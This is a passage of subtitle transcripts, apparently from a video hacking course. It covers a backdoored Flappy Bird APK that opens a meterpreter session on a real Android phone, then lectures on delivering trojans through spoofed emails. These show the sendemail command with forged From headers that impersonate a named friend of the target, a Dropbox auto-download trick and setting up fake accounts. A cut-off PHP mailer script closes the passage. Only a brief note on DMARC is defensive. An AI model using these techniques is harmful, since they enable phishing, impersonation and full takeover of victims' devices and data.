00:09:14,660  -->  00:09:20,440
You can also see that I set my LHOST to 192.168.0.38 and the port to '8080',

104

00:09:20,620  -->  00:09:24,920
again, the same options that I said when I created my backdoor.

105

00:09:25,640  -->  00:09:28,680
So I'm just going to exploit to listen for incoming connections now

106

00:09:29,180  -->  00:09:30,860
and that's it we're good to go.

107

00:09:31,040  -->  00:09:35,520
Now let's go to the Android device, download the backdoor and see if it works.

108

00:09:36,520  -->  00:09:42,500
Now, right here I have my HTC One device, it's a real Android device, this is not a virtual machine

109

00:09:42,860  -->  00:09:46,700
and this device is connected to my network.

110

00:09:47,400  -->  00:09:49,360
So I'm gonna go to my browser

111

00:09:50,420  -->  00:09:57,260
and I'm just going to download the file, so I want to go to 192.168.0.38

112

00:09:57,480  -->  00:10:04,860
and I want to download the file from evil-files/flappybird.apk.

113

00:10:09,060  -->  00:10:14,960
Now as you can see the file is downloaded so I'm gonna go from here

114

00:10:15,460  -->  00:10:19,100
and install the file, so I'm just gonna click it to install it

115

00:10:20,680  -->  00:10:24,560
then it's going to show me all the permissions that the file is asking for,

116

00:10:24,560  -->  00:10:28,040
so I'm just going to scroll down and click on install.

117

00:10:29,780  -->  00:10:35,580
Now as you can see we have a normal icon for Flappy Bird and if the now the app is installed.

118

00:10:35,580  -->  00:10:38,840
So you can open it from here or click on done, I'm just going to do done

119

00:10:39,360  -->  00:10:42,260
and then I'm just going to go on all my applications

120

00:10:43,260  -->  00:10:47,580
and you can see I have the app installed here and it's called Flappy Bird.

121

00:10:47,860  -->  00:10:50,280
So, I'm just gonna tap that to run the app

122

00:10:52,020  -->  00:10:55,920
and you see that I'm gonna just gonna get a normal game, that I can play.

123

00:11:01,560  -->  00:11:09,440
Okay, but if we go back to the Kali machine, you'll see that we got a 'meterpreter' session

124

00:11:09,600  -->  00:11:16,760
from the target device, from the target Android device and I can just do 'sysinfo' to confirm that

125

00:11:17,800  -->  00:11:21,900
and as you can see now I managed to gain full access to this Android device.

126

00:11:22,340  -->  00:11:27,500
Now I can access the camera access the mics and messages, access the files

127

00:11:27,500  -->  00:11:33,720
and do anything I want on that device and we managed to do this using a legitimate app

128

00:11:33,720  -->  00:11:36,780
and we injected our code in that app.

129

00:11:37,940  -->  00:11:42,300
So this opens a huge number of attack strategies you can pretend to be a friend

130

00:11:42,300  -->  00:11:46,740
and send an app to the person, you can pretend to be Facebook for example until the person

131

00:11:46,750  -->  00:11:51,460
there is a new update and download it, you can pretend to be a local restaurant

132

00:11:51,460  -->  00:11:57,380
and send the flyer into the house and ask the person to download a file using a QR code.

133

00:11:57,380  -->  00:12:02,060
There is a huge number of ways to use this to hack into your target.

134

00:12:02,540  -->  00:12:04,600
For now we're not talking about delivery methods,

135

00:12:04,600  -->  00:12:07,640
so yeah I just want to show you the whole technique behind it

136

00:12:07,780  -->  00:12:13,060
and as you can see we can hack into any Android phone using any app that we want.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 14: Delivery Methods

1

00:00:00,860  -->  00:00:06,760
Okay. Now that you know how to generate files that'll do what you want to do on the target computer

2

00:00:07,180  -->  00:00:12,960
and you also have gathered enough information about your target to build up an attack strategy.

3

00:00:14,100  -->  00:00:19,560
In this section we're going to show you a number of methods and ideas on,

4

00:00:19,560  -->  00:00:22,340
how to deliver your backdoor to the target person.

5

00:00:23,200  -->  00:00:26,080
Now, I'm going to teach these methods through scenarios.

6

00:00:26,220  -->  00:00:30,660
So, in each of these lecture, we're actually jona, gonna make a scenario and pretend

7

00:00:30,880  -->  00:00:34,600
that word hacking into a person and show how we deliver that back door

8

00:00:34,620  -->  00:00:39,900
or get that person to do what we want them to do and
from there we'll hack into their system.

9

00:00:40,600  -->  00:00:43,540
So, the main idea that you want to keep in your head,

10

00:00:43,880  -->  00:00:47,320
is that what you're going to learn in this section is Methods.

11

00:00:47,640  -->  00:00:50,820
So, I'm going to be using specific ideas and scenarios

12

00:00:51,380  -->  00:00:54,380
but you can use these methods with any idea that you have.

13

00:00:54,740  -->  00:01:00,480
So, depending on your target, you might have a different idea in your head on how to exploit that target.

14

00:01:01,120  -->  00:01:03,680
So, you want to learn the methods, I'm gonna show you now.

15

00:01:04,040  -->  00:01:08,540
The ideas and the scenarios are still useful but you're not limited to them.

16

00:01:09,940  -->  00:01:15,040
Also all the delivery methods that were going to be talking about will work on all operating systems.

17

00:01:15,640  -->  00:01:21,100
So and when creating the evil files,we covered a number of operating systems and we showed you,

18

00:01:21,100  -->  00:01:24,880
how to specifically create evil files for these systems,

19

00:01:25,400  -->  00:01:29,740
But when it comes to delivery, these methods will work on all operating systems.

20

00:01:29,980  -->  00:01:34,060
So, you have the freedom of using any of these methods against your target,

21

00:01:34,220  -->  00:01:37,980
just make sure the way that you're social engineering them

22

00:01:38,300  -->  00:01:41,040
and the, the file that you're asking them to run

23

00:01:41,120  -->  00:01:45,480
or the link that you're asking them to download, will work on their operating system

24

00:01:45,720  -->  00:01:49,400
but the methods in here, will work on all operating systems.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,530 --> 00:00:08,330
In the previous videos, we learned how to create a Trojan by backdooring normal files such as images,

2
00:00:08,330 --> 00:00:16,940
documents, songs, and so on, so that when executed, the user sees the normal file, but at the same

3
00:00:16,940 --> 00:00:21,560
time our evil code gets executed in the background.

4
00:00:22,800 --> 00:00:27,780
So the challenge now is how to deliver this Trojan to the target.

5
00:00:28,260 --> 00:00:34,800
The first delivery method that we're going to talk about, and my personal favorite is the mail delivery.

6
00:00:34,830 --> 00:00:40,710
Now this delivery method, just like any other delivery methods, relies on the information that you

7
00:00:40,710 --> 00:00:41,670
gathered so far.

8
00:00:41,670 --> 00:00:45,990
So information gathering is very, very important when it comes to this.

9
00:00:46,020 --> 00:00:51,500
This delivery method is really handy because you can use it in so many scenarios.

10
00:00:51,510 --> 00:00:56,450
You can use it to deliver all the back doors and the evil files that we've seen so far.

11
00:00:56,460 --> 00:01:02,470
You can use it to pretend to be a friend and contact your friend and tell him to download something.

12
00:01:02,490 --> 00:01:08,610
You can use it to pretend to be a website that the target website interacts with, and pretend to be

13
00:01:08,610 --> 00:01:12,230
the admin of the other website, and ask the target to do something.

14
00:01:12,240 --> 00:01:18,600
You can pretend to be a member of the support team that the target website uses, and then ask them

15
00:01:18,600 --> 00:01:23,640
to change their password, for example, for the web server that they're using, you can use it to pretend

16
00:01:23,640 --> 00:01:29,730
to be a company that your target interacts with, and tell them that there is a new update of your software

17
00:01:29,730 --> 00:01:33,980
that they already use, and then get them to download and install a backdoor.

18
00:01:33,990 --> 00:01:39,070
So the possibilities are limitless, really, when it comes to mail delivery.

19
00:01:39,090 --> 00:01:43,650
In this lecture, I'm going to show you an example of targeting a person that's called Zaid.

20
00:01:43,680 --> 00:01:46,590
Zaid could be just a normal person that you want to hack.

21
00:01:46,620 --> 00:01:50,970
He could be a friend of a person that you want to hack, but you want to hack Zaid first and then hack

22
00:01:51,000 --> 00:01:51,930
to that person.

23
00:01:51,960 --> 00:01:56,880
He could be the admin of a website, or he could be an employee of a company.

24
00:01:56,910 --> 00:01:58,110
It really doesn't matter.

25
00:01:58,110 --> 00:02:02,130
What we're looking at in this lecture is hacking a person that's called Zaid.

26
00:02:02,130 --> 00:02:08,130
And then from there, you can leverage that person to hack into other systems or into other networks

27
00:02:08,130 --> 00:02:09,720
or into a different company.

28
00:02:09,720 --> 00:02:14,700
And I have the information that we gathered already in our information gathering lecture.

29
00:02:14,700 --> 00:02:21,870
And after we gathered everything, we managed to see that Zaid has a number of friends in here and the

30
00:02:21,870 --> 00:02:27,690
same friends we managed to see their emails here and we managed to get Zaid's email, which is Zaid

31
00:02:27,690 --> 00:02:29,370
that I security.org.

32
00:02:29,430 --> 00:02:33,240
So what we're going to do is we're going to pretend to be one of these guys.

33
00:02:33,390 --> 00:02:38,100
So I'm ascr at I security.org and it's this person in here.

34
00:02:38,100 --> 00:02:39,720
His name is Mohammad Asghar.

35
00:02:39,810 --> 00:02:42,510
So we're going to pretend to be that person.

36
00:02:42,510 --> 00:02:47,490
We're going to send an email to Zaid, and the email is going to look as if it's coming from this person.

37
00:02:47,490 --> 00:02:50,940
And then we're going to ask Zaid to download a file.

38
00:02:51,740 --> 00:02:53,060
Let's see how this works.

39
00:02:53,060 --> 00:02:58,460
And this is going to be a more realistic delivery method that you can actually use in real life.

40
00:02:58,490 --> 00:03:00,830
Now there are a number of ways to do this.

41
00:03:00,860 --> 00:03:06,350
The easiest is just to go on Google and look for spoof emails online.

42
00:03:06,710 --> 00:03:10,160
You'll see a lot of websites that will allow you to do this.

43
00:03:10,190 --> 00:03:16,640
The only problem with these websites is the email that you're going to send will end up in the spam

44
00:03:16,640 --> 00:03:23,750
directory of the target person, so it will not be delivered into their inbox, which is not great.

45
00:03:24,110 --> 00:03:31,610
The main reason for this is because these websites are public, and a lot of people use them for spamming.

46
00:03:31,640 --> 00:03:39,410
Mail servers such as Google, Hotmail and Yahoo have blacklisted these servers, and any email that

47
00:03:39,410 --> 00:03:44,930
comes from the servers that these websites use will be marked as spam.

48
00:03:45,170 --> 00:03:51,560
Therefore, in order to bypass this, you can either use your own server if you already have a web hosting

49
00:03:51,560 --> 00:03:57,590
plan, or you can sign up for a free web hosting plan and use that to send your fake emails.

50
00:03:57,590 --> 00:04:04,880
Or an even better solution is to sign up for an SMTp or a mail server.

51
00:04:05,660 --> 00:04:09,770
Now again, there are a number of websites that offer this.

52
00:04:09,800 --> 00:04:15,230
A lot of them are paid, but with the paid websites, you'll actually get really, really good results

53
00:04:15,230 --> 00:04:20,780
because they are used by actual marketers and by actual companies to send emails.

54
00:04:20,780 --> 00:04:23,540
So spam is never sent through these servers.

55
00:04:23,840 --> 00:04:30,170
If you look through Google for a free SMTp server or a free mail server, you will find some websites

56
00:04:30,170 --> 00:04:32,900
and an example of this, this one right here.

57
00:04:32,990 --> 00:04:39,200
And this is also a really, really good website because it is a paid website, but they offer a free

58
00:04:39,200 --> 00:04:42,830
plan which we can use to send our fake emails.

59
00:04:43,160 --> 00:04:50,510
Again, this website is designed for email marketing and for actual companies to communicate with their

60
00:04:50,510 --> 00:04:51,230
customers.

61
00:04:51,230 --> 00:04:57,590
So when you send emails through the servers of this website, they will not be marked as spam because

62
00:04:57,590 --> 00:04:59,930
it's very rarely used for spam.

63
00:05:00,380 --> 00:05:02,660
So we're going to sign up with this website.

64
00:05:03,480 --> 00:05:09,240
Input my email and I'm going to set a password and create the account.

65
00:05:11,300 --> 00:05:14,930
Now I'm going to go to the email that I used when I signed up.

66
00:05:15,860 --> 00:05:18,680
And you'll see that we got a welcome message.

67
00:05:18,680 --> 00:05:22,850
And I'm going to confirm my email address to activate my account.

68
00:05:23,450 --> 00:05:25,520
Now it's asking me for more questions.

69
00:05:25,520 --> 00:05:31,490
So it's asking for my first name, last name, company name, phone number, company website and so

70
00:05:31,490 --> 00:05:31,940
on.

71
00:05:31,970 --> 00:05:34,550
You don't have to fill this very accurately.

72
00:05:34,550 --> 00:05:36,800
I'm just going to use any information for it.

73
00:05:37,770 --> 00:05:45,030
Just make sure you put a correct phone number because they will send a verification code to this phone

74
00:05:45,030 --> 00:05:45,660
number.

75
00:05:45,960 --> 00:05:48,850
Now it's asking us for the verification code.

76
00:05:48,870 --> 00:05:51,240
I have it here on my phone number.

77
00:05:52,490 --> 00:05:56,000
And finally it's asking us to select the plan.

78
00:05:56,030 --> 00:06:02,630
Like I said, the three one is fine unless you want to send a lot of emails on the same day.

79
00:06:04,010 --> 00:06:04,850
And that's it.

80
00:06:04,880 --> 00:06:05,900
We're good to go.

81
00:06:05,900 --> 00:06:13,370
In the next lecture, I will show you how to use the SMTp servers offered by this website in order to

82
00:06:13,370 --> 00:06:15,200
send fake emails.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,020 --> 00:00:04,970
Okay, so now that we signed up with the service in this lecture, I'm going to show you how to use

2
00:00:04,970 --> 00:00:10,760
the SMTp servers offered by this service in order to send fake emails.

3
00:00:11,030 --> 00:00:14,750
So first of all, we're going to go on the transactional in here.

4
00:00:14,750 --> 00:00:21,560
And you'll see that we have all of the information that we need to authenticate with the SMTp servers

5
00:00:21,560 --> 00:00:25,730
offered by this website in order to send the fake emails.

6
00:00:26,300 --> 00:00:32,810
So right now we just need to use a program in order to authenticate and then send the fake emails.

7
00:00:32,930 --> 00:00:37,670
So in Kali we're going to use a program called Send Email.

8
00:00:37,880 --> 00:00:44,030
And because this is the first time we're using this program, it's always a good idea to run the program

9
00:00:44,030 --> 00:00:49,490
with the dash dash help argument to see how to use it and all of the available options.

10
00:00:50,200 --> 00:00:54,860
So scrolling up you can see the main usage is send email.

11
00:00:54,880 --> 00:00:58,570
We're using the dash f argument and then you set the options.

12
00:00:58,720 --> 00:01:05,980
Now before doing this, the first thing I want to do is set the username and the password using the

13
00:01:05,980 --> 00:01:09,370
dash and the dash exp arguments.

14
00:01:09,760 --> 00:01:14,950
So our command is going to be send email dash x you.

15
00:01:15,950 --> 00:01:17,330
To give the username.

16
00:01:17,330 --> 00:01:25,070
And if we go up we have the username here which is John Wick 70 at gmail.com in my case.

17
00:01:25,070 --> 00:01:27,890
So I'm going to copy it and paste it here.

18
00:01:28,580 --> 00:01:30,410
Next we need to set the password.

19
00:01:30,410 --> 00:01:33,500
We're going to use the dash exp to do that.

20
00:01:33,500 --> 00:01:36,800
And again if we scroll up we have the password here.

21
00:01:37,070 --> 00:01:39,890
So copy and paste it there.

22
00:01:40,670 --> 00:01:43,160
Next we'll need to specify the server.

23
00:01:43,160 --> 00:01:45,830
So we're going to use the Dash S option.

24
00:01:45,830 --> 00:01:50,660
And as you can see you first give it the server colon followed by the port.

25
00:01:50,660 --> 00:01:52,580
An example is this.

26
00:01:53,390 --> 00:01:58,670
So if we go up, you can see that our server is this one right here.

27
00:01:58,670 --> 00:02:00,950
So again Ctrl C to copy it.

28
00:02:00,950 --> 00:02:04,280
And our port is going to be 587.

29
00:02:04,670 --> 00:02:08,900
So going down we're going to do s to specify the server.

30
00:02:08,900 --> 00:02:11,540
We're going to give it the server that we just copied.

31
00:02:11,540 --> 00:02:14,660
And I'm going to type colon followed by the port.

32
00:02:14,660 --> 00:02:18,200
And as we seen before the port is 587.

33
00:02:18,200 --> 00:02:21,200
So I'm going to type 587.

34
00:02:22,730 --> 00:02:25,990
So so far we haven't composed the email yet.

35
00:02:26,000 --> 00:02:30,380
All we're doing is we're authenticating with the email server.

36
00:02:30,380 --> 00:02:35,360
So this step is very similar to what you do when you go to gmail.com.

37
00:02:35,360 --> 00:02:41,150
For example, the first thing that you get asked for is your username and a password, and only once

38
00:02:41,150 --> 00:02:43,610
you log in you can start sending emails.

39
00:02:43,610 --> 00:02:45,260
So this is what we're doing right here.

40
00:02:45,260 --> 00:02:49,100
We first log it in with our username, password and server.

41
00:02:49,100 --> 00:02:53,600
And now that we're logged in we can go ahead and start composing our email.

42
00:02:53,930 --> 00:02:58,160
Now the cool thing about this this is not an ordinary email client.

43
00:02:58,160 --> 00:03:00,380
We can actually set the from email.

44
00:03:00,380 --> 00:03:06,230
And when the email is delivered, it's going to appear as if it's sent from the from email that we pick

45
00:03:06,230 --> 00:03:06,980
in here.

46
00:03:07,310 --> 00:03:15,230
Now from our information gathering stage, we discovered that our target's email is Zaid at security.org.

47
00:03:15,230 --> 00:03:21,740
And we discovered that this target, Zaid, is linked to another person named Mohammad Asgar.

48
00:03:21,740 --> 00:03:26,060
And his email is M Dot Asgar at security.org.

49
00:03:26,940 --> 00:03:31,980
So when picking this from email, you want to make sure that you pick an existing email, something

50
00:03:31,980 --> 00:03:38,220
that exists, and you want to make sure that you pick an email that your target usually receives emails

51
00:03:38,220 --> 00:03:38,720
from.

52
00:03:38,730 --> 00:03:44,310
This will increase the chances of your target opening the email, and it will also ensure that the email

53
00:03:44,310 --> 00:03:47,280
will be delivered in the inbox and not in the spam.

54
00:03:48,070 --> 00:03:53,650
So I'm going to set my from email to m dot ascr at security.org.

55
00:03:54,350 --> 00:04:01,490
Next, we're going to use the Dash T option to specify the email that we want to send this email to.

56
00:04:01,490 --> 00:04:09,380
And from our information gathering stage, we know that the email of our target is Z at security.org.

57
00:04:09,500 --> 00:04:15,320
Next, we're going to use the dash argument to specify the title of the email.

58
00:04:15,320 --> 00:04:18,140
So I'm just going to say check out this car.

59
00:04:18,850 --> 00:04:23,890
And then we're going to use the Dash M option to specify the message body.

60
00:04:24,160 --> 00:04:30,970
Now, when specifying the title and the message body, you want to keep in mind the person you're pretending

61
00:04:31,000 --> 00:04:35,380
to be, the target person, and the relationship between the two.

62
00:04:35,470 --> 00:04:42,170
If you're pretending to be a boss or a colleague, then you might want to keep these more formal.

63
00:04:42,190 --> 00:04:44,890
But in my case, I'm pretending to be a friend.

64
00:04:44,890 --> 00:04:47,830
So I'm going to keep my title and the message casual.

65
00:04:47,830 --> 00:04:51,000
And I'm just going to say, hey, man, check out this car.

66
00:04:51,010 --> 00:04:52,600
I'm thinking of buying it.

67
00:04:53,190 --> 00:04:59,850
And then we want to give him a link to download the Trojan that shows a picture of a car that we created

68
00:04:59,850 --> 00:05:00,630
before.

69
00:05:00,780 --> 00:05:04,530
So you can upload your Trojan to any file sharing service.

70
00:05:04,710 --> 00:05:11,690
I chose to upload it to Dropbox and I've already logged in to my Dropbox account in here.

71
00:05:11,700 --> 00:05:15,900
If you don't know how to upload stuff to Dropbox, you simply click on the upload.

72
00:05:15,900 --> 00:05:20,460
In here, you select the file and then the file will be uploaded in here.

73
00:05:20,760 --> 00:05:22,800
So I'm not going to show you how to do that.

74
00:05:22,800 --> 00:05:26,240
It's very simple and there's no point of wasting time on it.

75
00:05:26,250 --> 00:05:30,570
I already have the Trojan that shows a picture of the image right here.

76
00:05:30,570 --> 00:05:34,320
So I'm just going to click on share to get the link for it.

77
00:05:34,320 --> 00:05:36,570
And I'm going to click on Copy Link.

78
00:05:37,920 --> 00:05:39,870
Now let me show you this trick.

79
00:05:39,900 --> 00:05:47,760
If I just go in a new tab and paste my download link, you will see that the file will not be automatically

80
00:05:47,760 --> 00:05:48,570
downloaded.

81
00:05:48,600 --> 00:05:53,760
I'll first go to Dropbox and then the user will have to click on download to download it.

82
00:05:54,300 --> 00:06:02,280
But if we modify the URL and just put a one in here instead of the zero, and if I hit enter.

83
00:06:02,880 --> 00:06:07,980
You'll see it'll automatically download the file for the user.

84
00:06:08,100 --> 00:06:10,320
And this is exactly what I want.

85
00:06:10,530 --> 00:06:15,630
Therefore I'm just going to go down now and paste the file in here.

86
00:06:16,690 --> 00:06:17,590
And that's it.

87
00:06:17,620 --> 00:06:21,940
Now, if we hit enter, this message will be sent and delivered to the target.

88
00:06:22,030 --> 00:06:26,860
But it's going to say M dot Oscar at Security.org.

89
00:06:26,860 --> 00:06:34,180
And here, while actual messages that come from this person display the person's name, as you can see

90
00:06:34,180 --> 00:06:37,030
in here, they will actually say Mohammad Oscar.

91
00:06:37,270 --> 00:06:38,920
But don't worry about this.

92
00:06:38,950 --> 00:06:45,430
In the next lecture, I'm going to teach you how to use advanced options to do that and set the sender

93
00:06:45,430 --> 00:06:47,830
name to anything that you want.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,020 --> 00:00:06,350
Now, as shown in the previous lecture, setting the from email might not be enough to make our fake

2
00:00:06,380 --> 00:00:09,260
emails look identical to real emails.

3
00:00:09,290 --> 00:00:15,500
Therefore, in this lecture, I'm going to teach you how to set the sender name so that our fake emails

4
00:00:15,500 --> 00:00:19,850
look identical to real emails sent by real people.

5
00:00:20,030 --> 00:00:23,720
To do that, we're going to have to use advanced options.

6
00:00:23,840 --> 00:00:30,170
So coming back to the terminal window, if you look in here, you can see we can use the oh argument

7
00:00:30,170 --> 00:00:32,540
to specify advanced options.

8
00:00:32,720 --> 00:00:38,180
And the advanced option that we want to use is a message header right here.

9
00:00:38,800 --> 00:00:40,420
So I'm going to copy this.

10
00:00:40,420 --> 00:00:46,180
And in our terminal I'm going to do dash o to specify an advanced option.

11
00:00:46,180 --> 00:00:49,810
And the advanced option that I want to set is a message header.

12
00:00:49,810 --> 00:00:54,250
And this message header is going to be the from header.

13
00:00:54,580 --> 00:00:59,200
And I want to set this to the name that I want it to appear in here.

14
00:00:59,200 --> 00:01:02,500
So in my case I wanted to say Mohammad Oscar.

15
00:01:03,250 --> 00:01:07,960
Then we're going to put the from email inside the greater and smaller signs.

16
00:01:07,960 --> 00:01:13,570
So again the from email in my case is m dot Ascr at security.org.

17
00:01:14,550 --> 00:01:15,280
And that's it.

18
00:01:15,300 --> 00:01:15,940
We're done.

19
00:01:15,960 --> 00:01:20,010
Now, before hitting enter and send in this message, I'm going to clear the screen.

20
00:01:20,010 --> 00:01:24,690
And I just want to walk you through the command just to make sure that you understand what we're doing.

21
00:01:25,020 --> 00:01:28,560
So first of all, we're using a program called Send Email.

22
00:01:28,560 --> 00:01:35,040
This is the email client that we're using in order to first authenticate with our email server and then

23
00:01:35,040 --> 00:01:36,060
send the email.

24
00:01:36,700 --> 00:01:40,270
Then the command is split into two stages.

25
00:01:40,300 --> 00:01:44,740
The first stage is where we authenticate with the email server.

26
00:01:44,770 --> 00:01:48,280
Like I said, this is similar to what you do when you go to Gmail.

27
00:01:48,310 --> 00:01:51,640
First you have to log in and this is what we're doing here.

28
00:01:51,640 --> 00:01:55,060
We're using the dash argument to specify the email.

29
00:01:55,090 --> 00:02:03,160
We're using the dash exp argument to specify the password and dash s to specify the server.

30
00:02:03,430 --> 00:02:08,410
So if I go up, we got all of this information from the server that we signed up for.

31
00:02:08,410 --> 00:02:10,150
So we got it from here.

32
00:02:10,850 --> 00:02:17,180
Now, once we log in and authenticate, the next stage is to actually send the email to compose the

33
00:02:17,180 --> 00:02:17,930
message.

34
00:02:18,110 --> 00:02:22,700
So we're using the form argument to specify the from email.

35
00:02:22,730 --> 00:02:28,160
We're using the dashed argument to specify the email we want to send the email to.

36
00:02:28,340 --> 00:02:35,150
We're using dash you to specify the title dash M to specify the message body.

37
00:02:35,300 --> 00:02:39,890
And finally we use an advanced option to set the message header.

38
00:02:39,890 --> 00:02:46,460
And we set the message header to whatever we want to appear beside the email title when the email is

39
00:02:46,460 --> 00:02:48,020
delivered in the inbox.

40
00:02:48,830 --> 00:02:50,870
So we're ready to send this.

41
00:02:50,870 --> 00:02:52,160
I'm going to hit enter.

42
00:02:54,030 --> 00:02:54,780
And perfect.

43
00:02:54,780 --> 00:03:01,170
As you can see, it's saying email is sent successfully and I'm actually already listening for incoming

44
00:03:01,170 --> 00:03:04,620
connections in here in my multi handler.

45
00:03:05,140 --> 00:03:06,940
So let's go to the target.

46
00:03:06,940 --> 00:03:09,370
And as you can see we have a new email.

47
00:03:09,370 --> 00:03:11,260
It's coming from Mohammad Asghar.

48
00:03:11,260 --> 00:03:15,310
So exactly like a legitimate email coming from this person.

49
00:03:15,790 --> 00:03:19,630
We can see the subject like we said it and we can see the body.

50
00:03:20,570 --> 00:03:25,400
Now, if we go inside again, we have a thumbnail of this person.

51
00:03:25,400 --> 00:03:26,780
It's showing his name.

52
00:03:26,780 --> 00:03:28,220
It's showing his email.

53
00:03:28,220 --> 00:03:29,720
It's showing his picture.

54
00:03:29,720 --> 00:03:31,100
So it looks legit.

55
00:03:31,130 --> 00:03:35,090
It looks like a proper message sent from this person.

56
00:03:35,600 --> 00:03:42,050
Now this person is a friend of mine, and we tailored the message so that it appears as if it's coming

57
00:03:42,050 --> 00:03:43,100
from a friend.

58
00:03:43,220 --> 00:03:45,110
If I click on the link.

59
00:03:45,600 --> 00:03:49,210
You'll see the file will automatically start downloading.

60
00:03:49,230 --> 00:03:55,590
Dropbox is not asking us if we actually want to download this, so I'm going to click okay to download

61
00:03:55,590 --> 00:03:56,070
it.

62
00:03:56,600 --> 00:03:58,940
It's going to go in my downloads.

63
00:03:59,240 --> 00:04:04,790
So if we open the downloads right click and uncompressed this.

64
00:04:06,260 --> 00:04:12,050
We'll have the Gt-r with the image, with the proper extension like we seen before.

65
00:04:12,050 --> 00:04:13,820
And if we double click it.

66
00:04:14,380 --> 00:04:18,250
We'll see the picture of the car that my friend is trying to buy.

67
00:04:18,280 --> 00:04:25,360
So everything looks legit so far, but if we go back to the Kali machine, you'll see that we got a

68
00:04:25,360 --> 00:04:30,850
connection from the target and we basically gained full access to their computer.

69
00:04:31,860 --> 00:04:35,190
So if we do there you'll see all the directories.

70
00:04:35,190 --> 00:04:38,070
And basically we can run any system command.

71
00:04:38,100 --> 00:04:44,610
Now it is very important to note that this will only work if the domain that you are spoofing or setting

72
00:04:44,610 --> 00:04:49,350
the sender to does not implement proper email authentication.

73
00:04:49,350 --> 00:04:57,510
With that being said, many statistics suggest that over 80% of organizations around the world do not

74
00:04:57,510 --> 00:05:04,440
implement proper email authentication, and therefore you'd be able to impersonate these organizations

75
00:05:04,440 --> 00:05:09,600
and send emails and make them appear as if they're sent from these organizations.

76
00:05:09,630 --> 00:05:15,360
Now, to check if a domain can be spoofed, you can easily go to this website right here.

77
00:05:15,360 --> 00:05:21,510
And all you have to do is put the domain that you want to spoof or impersonate in here.

78
00:05:21,510 --> 00:05:29,640
So for example, if we put Z security.org, which is our company domain, you'll see that we have no

79
00:05:29,640 --> 00:05:30,770
dMarc records.

80
00:05:30,780 --> 00:05:33,540
It's telling us that nothing is detected.

81
00:05:33,540 --> 00:05:40,440
And therefore we can actually send emails and make them appear like they're sent from any email at Z.

82
00:05:40,440 --> 00:05:41,790
Security.org.

83
00:05:41,790 --> 00:05:45,060
And we did that on purpose to show you in this lecture.

84
00:05:45,060 --> 00:05:46,680
So this is very, very dangerous.

85
00:05:46,680 --> 00:05:52,920
And if you own or manage a domain that is not implementing this properly, then you should really fix

86
00:05:52,920 --> 00:05:58,980
this, because this means that hackers can spoof emails and make them seem as if they're sent from your

87
00:05:59,010 --> 00:06:01,260
domain or your organization.

88
00:06:02,300 --> 00:06:07,280
Now, the main thing that you want to keep in mind when it comes to this method is that this method

89
00:06:07,280 --> 00:06:13,430
is generic, so it works against windows, Linux OS, Android doesn't really matter.

90
00:06:13,460 --> 00:06:19,280
The only thing that you want to make sure is the file that you're sending to the target should work

91
00:06:19,280 --> 00:06:21,170
on their target operating system.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,080 --> 00:00:07,640
In the previous lecture we seen how to use an Smtp server to spoof emails and make them appear like

2
00:00:07,640 --> 00:00:11,090
they're sent from any other email address we want.

3
00:00:11,570 --> 00:00:18,410
I also mentioned in the previous lecture that there is another way of doing this and that is using a

4
00:00:18,410 --> 00:00:19,490
web hosting.

5
00:00:19,820 --> 00:00:25,250
Web hosting is simply a service that allows us to host files on the internet.

6
00:00:25,280 --> 00:00:28,430
Therefore, we can use it to host our own website.

7
00:00:28,430 --> 00:00:34,760
We can use it to share files, or we can even use the server resources to send emails, as I'm going

8
00:00:34,760 --> 00:00:36,260
to show you in this lecture.

9
00:00:36,530 --> 00:00:42,230
So as you can see, learning how to set up and use a web hosting can be useful in many scenarios and

10
00:00:42,230 --> 00:00:45,740
you can actually use it to do much more than what I'm going to show you here.

11
00:00:46,010 --> 00:00:51,050
Now, if you look on Google, you'll find a lot of free web hosting providers.

12
00:00:51,200 --> 00:00:55,420
Unfortunately, though, none of them allow you to send emails.

13
00:00:55,430 --> 00:01:01,080
That's not really a big problem because even paid web hosting plans are very, very cheap.

14
00:01:01,110 --> 00:01:06,450
You can look online for the cheapest and you can use any provider you want because the steps that I'm

15
00:01:06,450 --> 00:01:09,180
going to show you will work with any provider.

16
00:01:09,180 --> 00:01:13,110
But right here I have a web hosting provider called Dreamhost.

17
00:01:13,140 --> 00:01:15,470
They are pretty cheap and they work well.

18
00:01:15,480 --> 00:01:24,480
So if we click on Get Started in here, you'll see the cheapest plan is to $95 per month.

19
00:01:24,660 --> 00:01:26,520
So we're going to click on Sign Up.

20
00:01:27,270 --> 00:01:31,740
I'm going to set this to monthly and you'll notice the price will actually increase slightly.

21
00:01:31,740 --> 00:01:36,060
So now it's $5 per month instead of 295 if you paid for a year.

22
00:01:36,060 --> 00:01:37,260
But that's fine.

23
00:01:37,500 --> 00:01:40,590
And I'm going to say choose a domain later.

24
00:01:40,770 --> 00:01:45,030
You'll only really need to use a domain if you're hosting your own website.

25
00:01:45,060 --> 00:01:51,390
The domain is what you see here on top when it says, for example, dreamhost.com or security.com.

26
00:01:51,390 --> 00:01:53,430
But in our case, we don't need that.

27
00:01:53,430 --> 00:01:59,130
So we're just going to say choose a domain later and we're going to select our payment method.

28
00:01:59,130 --> 00:02:00,750
I'm going to pay with PayPal.

29
00:02:01,750 --> 00:02:04,730
Next, you have to put the billing address.

30
00:02:04,750 --> 00:02:07,420
Now you don't have to put correct information in here.

31
00:02:07,420 --> 00:02:09,060
You can put whatever you want.

32
00:02:09,070 --> 00:02:11,230
So I'm just going to fill this randomly.

33
00:02:11,620 --> 00:02:13,540
Next, we have the account setup.

34
00:02:13,540 --> 00:02:17,860
Make sure you put a valid email in here because they will send you a confirmation.

35
00:02:17,860 --> 00:02:26,020
So I'm going to use my own email and put a first name, last name, phone number.

36
00:02:26,020 --> 00:02:27,760
Again, it doesn't have to be real.

37
00:02:27,850 --> 00:02:31,210
We're going to uncheck this to not receive marketing.

38
00:02:31,660 --> 00:02:34,990
We don't want WordPress installed, so we're unchecking this.

39
00:02:35,020 --> 00:02:41,650
We don't want protection, so we're unchecking this and we don't want the email service that they provide.

40
00:02:41,650 --> 00:02:47,800

<?php

if (isset($_POST["send"])) {

	$to = $_POST["to"];
	$subject = $_POST["subject"];
	$message = $_POST["message"];
	$from = $_POST["from"];
	$name = $_POST["name"];

